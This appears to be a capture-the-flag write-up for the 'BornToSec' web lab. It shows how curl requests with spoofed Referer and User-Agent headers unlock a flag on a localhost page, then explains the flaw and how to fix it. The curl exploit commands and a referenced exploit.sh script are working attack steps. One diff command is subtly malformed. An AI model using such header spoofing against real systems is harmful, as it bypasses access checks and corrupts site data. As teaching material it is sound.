# Custom curl request with evil headers

## How we found the breach

When clicking on the "BornToSec" text that is in the footer, we are redirected to `http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`. Inspecting the page we can find several suspicious HTML comments.

```html
<!--
You must come from : "https://www.nsa.gov/".
-->

<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

The first one suggests that we're coming from a specific URL, well then let's just try it.

### Custom curl Referrer header

We will use curl to perform our requests, using `curl --header "Header_foo: bar"` we can define custom header key value pairs. Also we will make a diff between the default page and our custom curl result. First the Referrer header using `curl --header "Referer: https://www.nsa.gov/" url`.

```bash
diff <(curl --silent "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f") <(curl --silent --header "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f")
```

**Output:**

```
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> FIRST STEP DONE<audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

As we can see the server sent back a different page content `FIRST STEP DONE`. The second suspicious comment is talking about a browser, let's play with the User-Agent header.

### Custom curl User-Agent header

Let's take our previous step command and add custom header for the user agent, using `curl --header "User-Agent: browser"`.

```bash
diff <(curl --silent "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f") <(curl --silent --header "Referer: https://www.nsa.gov/" --header "User-Agent: ft_bornToSec" "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f")
```

**Output:**

```
37c37
< <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
---
> <center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
```

There we go! In the returned page we can find the flag!

## How to exploit it

### Step-by-step exploitation:

1. **Inspect the target page**: Navigate to the vulnerable page and view the page source to look for HTML comments that might contain hints.

2. **Identify suspicious comments**: Look for comments that mention:

   - Specific referrer URLs
   - Specific user agents or browsers
   - Other header requirements

3. **Test with Referer header**: Use curl with a custom Referer header:

   ```bash
   curl --header "Referer: https://www.nsa.gov/" "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
   ```

4. **Add User-Agent header**: Combine both headers:

   ```bash
   curl --header "Referer: https://www.nsa.gov/" --header "User-Agent: ft_bornToSec" "http://localhost:8080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f"
   ```

5. **Compare responses**: Use diff to compare the default response with the modified headers to see what changed.

6. **Extract the flag**: The flag should appear in the response when both headers are set correctly.

### Using the provided script:

You can use the `exploit.sh` script to automate this process:

```bash
./exploit.sh http://localhost:8080
```

## Why This Is a Problem

- **Header-Based Authorization**: The server makes authorization decisions based on HTTP headers, which can be easily spoofed by attackers.

- **Client-Side Trust**: Trusting client-controlled headers (Referer, User-Agent) for security decisions is fundamentally insecure.

- **Information Disclosure**: HTML comments in the source code reveal sensitive information about required headers, making exploitation trivial.

- **Real-World Impact**:

  - **Analytics Corruption**: Attackers can send requests with fake Referer headers to corrupt website statistics, misleading business decisions.
  - **Transaction Manipulation**: If headers are used for authentication or authorization, attackers could bypass security controls.
  - **Business Intelligence**: Corrupted analytics data can lead to poor business decisions based on false metrics.

- **Referrer Spam**: This is a common technique used by spammers to:
  - Inflate traffic statistics
  - Mislead website owners about traffic sources
  - Potentially gain SEO benefits
  - Corrupt analytics data

## How to Fix It

1. **Never Trust Headers for Security**:

   - HTTP headers are client-controlled and can be easily spoofed.
   - Never use headers (Referer, User-Agent, etc.) for authentication or authorization decisions.
   - Always validate security on the server side using secure tokens or sessions.

   ```php
   // Bad: Trusting Referer header
   if ($_SERVER['HTTP_REFERER'] === 'https://www.nsa.gov/') {
       // Grant access
   }

   // Good: Server-side authentication
   session_start();
   if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
       // Grant access
   }
   ```

2. **Remove Sensitive Comments**:

   - Remove all HTML comments that contain sensitive information before deploying to production.
   - Use build tools to strip comments automatically.
   - Never commit sensitive hints or requirements in source code.

   ```bash
   # Use tools to remove comments
   # Or configure your build process to strip them
   ```

3. **Implement Proper Authentication**:

   - Use secure session-based authentication.
   - Implement CSRF tokens for state-changing operations.
   - Use secure, HTTP-only cookies for session management.

4. **Protect Analytics from Spam**:

   - Implement referrer validation and filtering.
   - Use server-side analytics that validate referrer sources.
   - Filter out known spam referrers.
   - Implement rate limiting to prevent automated spam.

   ```php
   // Example: Filter known spam referrers
   $spam_referrers = ['spam-site.com', 'fake-referrer.com'];
   $referer = $_SERVER['HTTP_REFERER'] ?? '';

   if (!in_array(parse_url($referer, PHP_URL_HOST), $spam_referrers)) {
       // Log legitimate referrer
   }
   ```

5. **Use Security Headers**:

   - Implement Content Security Policy (CSP).
   - Use Referrer-Policy header to control referrer information.
   - Set appropriate security headers to prevent various attacks.

   ```apache
   # .htaccess example
   Header set Referrer-Policy "strict-origin-when-cross-origin"
   ```

6. **Monitor and Log**:
   - Log all requests with unusual headers.
   - Monitor for patterns that indicate header manipulation.
   - Set up alerts for suspicious activity.

## Additional Resources

For more information about referrer spam and analytics protection:

- [Plausible - Top Referrers](https://plausible.io/docs/top-referrers)
- [Plausible - Referrer Policy](https://plausible.io/blog/referrer-policy)
- [Optimize Smart - Removing Referrer Spam](https://www.optimizesmart.com/geek-guide-removing-referrer-spam-google-analytics/)
- [Kinsta - Google Analytics Spam](https://kinsta.com/blog/google-analytics-spam/)

## Security Lesson

This vulnerability demonstrates a critical security flaw where client-controlled data (HTTP headers) is trusted for security decisions. Always remember:

**Never trust the client. All security decisions must be made on the server side using validated, server-controlled data.**
